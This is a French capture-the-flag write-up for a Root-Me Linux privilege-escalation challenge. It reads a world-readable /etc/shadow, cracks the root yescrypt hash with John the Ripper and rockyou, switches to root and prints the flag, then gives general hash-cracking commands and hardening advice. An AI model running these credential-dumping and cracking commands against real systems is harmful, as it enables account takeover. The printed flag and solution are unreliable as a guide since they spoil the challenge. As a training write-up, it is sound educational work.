# Linux Privesc - Weak Credentials (Root-Me Challenge)

## Informations de connexion

```
Host: sockets.challenges.root-me.pro
Port: 32011
Utilisateur: user
Mot de passe: password
```

### Commande de connexion SSH

```bash
ssh user@sockets.challenges.root-me.pro -p 32011
```

---

## Objectif

Un administrateur système a mal configuré les permissions sur certains fichiers critiques. Exploiter cette erreur pour obtenir un accès root et lire `/root/flag.txt`.

---

## Reconnaissance

### Vérification des permissions sur les fichiers critiques

```bash
user@challenge:~$ ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
-rw-r--r-- 1 root root   1126 Jul 13  2025 /etc/passwd
-rw-r--r-- 1 root shadow  751 Jul 13  2025 /etc/shadow
-r--r----- 1 root root   1714 Jun 24  2025 /etc/sudoers
```

### Vulnérabilité identifiée

```
/etc/shadow : -rw-r--r--
              │  │  └── Autres: lecture (r) ← VULNÉRABILITÉ!
              │  └── Groupe: lecture (r)
              └── Propriétaire: lecture/écriture (rw)
```

**Problème :** Le fichier `/etc/shadow` est lisible par tous les utilisateurs !

Permissions normales :
```
-rw-r----- 1 root shadow  /etc/shadow  (640)
```

Permissions actuelles (vulnérables) :
```
-rw-r--r-- 1 root shadow  /etc/shadow  (644)
```

---

## Extraction du hash

### Lecture du fichier shadow

```bash
user@challenge:~$ cat /etc/shadow
root:$y$j9T$pTeNwWwYU4KfCLDU4sNS91$gi9hLxjl3mnhLTEZQ9o0aMNvcKc150eM6NO1ihfXIvA:20282:0:99999:7:::
daemon:*:20269:0:99999:7:::
bin:*:20269:0:99999:7:::
...
user:$y$j9T$ILM78dM75JvBOTyhwmlrI/$dM2dJW9cNpmzZ7m0F2hLQ6CEJwyvP4xKZSCnbUZ6T99:20282:0:99999:7:::
```

### Analyse du hash root

```
$y$j9T$pTeNwWwYU4KfCLDU4sNS91$gi9hLxjl3mnhLTEZQ9o0aMNvcKc150eM6NO1ihfXIvA
│ │ │  │                      └── Hash du mot de passe
│ │ │  └── Salt
│ │ └── Paramètres de coût
│ └── Identifiant de l'algorithme
└── Début du hash

$y$ = yescrypt (algorithme moderne de hachage)
```

---

## Cracking du hash

### Préparation du fichier

```bash
# Sur la machine locale
echo 'root:$y$j9T$pTeNwWwYU4KfCLDU4sNS91$gi9hLxjl3mnhLTEZQ9o0aMNvcKc150eM6NO1ihfXIvA' > hash.txt
```

### Cracking avec John the Ripper

```bash
# Méthode 1 : Format automatique
john --wordlist=~/wordlists/rockyou.txt hash.txt

# Méthode 2 : Format crypt explicite
john --format=crypt --wordlist=~/wordlists/rockyou.txt hash.txt
```

### Résultat

```
user@local:~$ john --format=crypt --wordlist=~/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob        (root)
1g 0:00:00:42 DONE (2026-02-23 10:15) 0.02352g/s 245.1p/s 245.1c/s 245.1C/s
Session completed
```

**Mot de passe trouvé :** `spongebob`

---

## Exploitation

### Connexion en tant que root

```bash
user@challenge:~$ su - root
Password: spongebob
root@challenge:~# whoami
root
```

### Lecture du flag

```bash
root@challenge:~# cat /root/flag.txt
RM{1aff3a9bb941baf1d7476086ded0635e}
```

---

## Schéma de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│              MAUVAISE CONFIGURATION                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  /etc/shadow                                                │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Permissions: -rw-r--r-- (644)                       │   │
│  │              ↑                                       │   │
│  │        Lisible par TOUS!                             │   │
│  │                                                      │   │
│  │ Contenu:                                             │   │
│  │ root:$y$j9T$pTeNwWwYU4KfCLDU4sNS91$gi9hLxjl...     │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    CRACKING DU HASH                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Extraire le hash:                                       │
│     cat /etc/shadow | grep root > hash.txt                  │
│                                                             │
│  2. Cracker avec John:                                      │
│     john --format=crypt --wordlist=rockyou.txt hash.txt     │
│                                                             │
│  3. Résultat:                                               │
│     spongebob (root)                                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    ACCÈS ROOT                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  su - root                                                  │
│  Password: spongebob                                        │
│                                                             │
│  cat /root/flag.txt                                         │
│  RM{1aff3a9bb941baf1d7476086ded0635e}                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Flag

```
RM{1aff3a9bb941baf1d7476086ded0635e}
```

---

## Algorithmes de hachage Linux

| Préfixe | Algorithme | Sécurité |
|---------|------------|----------|
| `$1$` | MD5 | Faible (obsolète) |
| `$5$` | SHA-256 | Moyenne |
| `$6$` | SHA-512 | Bonne |
| `$y$` | yescrypt | Excellente (recommandé) |
| `$2a$`, `$2b$` | bcrypt | Excellente |

---

## Outils de cracking

### John the Ripper

```bash
# Installation
apt install john

# Cracking basique
john hash.txt

# Avec wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Format spécifique
john --format=crypt hash.txt

# Afficher les mots de passe crackés
john --show hash.txt
```

### Hashcat

```bash
# Installation
apt install hashcat

# Mode yescrypt (mode 28100)
hashcat -m 28100 hash.txt /usr/share/wordlists/rockyou.txt

# Avec règles
hashcat -m 28100 -r /usr/share/hashcat/rules/best64.rule hash.txt wordlist.txt
```

---

## Comment sécuriser

### 1. Permissions correctes sur /etc/shadow

```bash
# Vérifier les permissions
ls -la /etc/shadow

# Corriger si nécessaire
chmod 640 /etc/shadow
chown root:shadow /etc/shadow
```

### 2. Utiliser des mots de passe forts

```bash
# Générer un mot de passe aléatoire
openssl rand -base64 32

# Ou utiliser pwgen
pwgen -s 20 1
```

### 3. Politique de mots de passe

Configurer `/etc/login.defs` :
```
PASS_MIN_LEN 12
PASS_MAX_DAYS 90
PASS_WARN_AGE 7
```

### 4. Audit régulier

```bash
# Vérifier les fichiers avec permissions anormales
find /etc -perm /o+r -name "*shadow*" 2>/dev/null
find /etc -perm /o+w 2>/dev/null
```

---

## Wordlists populaires

| Wordlist | Taille | Description |
|----------|--------|-------------|
| rockyou.txt | 14M | Mots de passe réels (leak RockYou 2009) |
| SecLists | Variable | Collection complète |
| crackstation.txt | 15GB | Très complète |
| darkweb2017.txt | 1.4GB | Compilation dark web |

Emplacement typique :
```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/
```

---

## Commandes utiles

```bash
# Vérifier les permissions des fichiers sensibles
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/gshadow

# Extraire les hashes pour cracking
cat /etc/shadow | grep -v ":\*:" | grep -v ":!:"

# Unshadow (combiner passwd et shadow pour John)
unshadow /etc/passwd /etc/shadow > combined.txt

# Vérifier la force d'un mot de passe
echo "password" | cracklib-check
```

---

## Ressources

- [John the Ripper](https://www.openwall.com/john/)
- [Hashcat](https://hashcat.net/hashcat/)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [CrackStation](https://crackstation.net/)
- `man shadow` - Format du fichier shadow
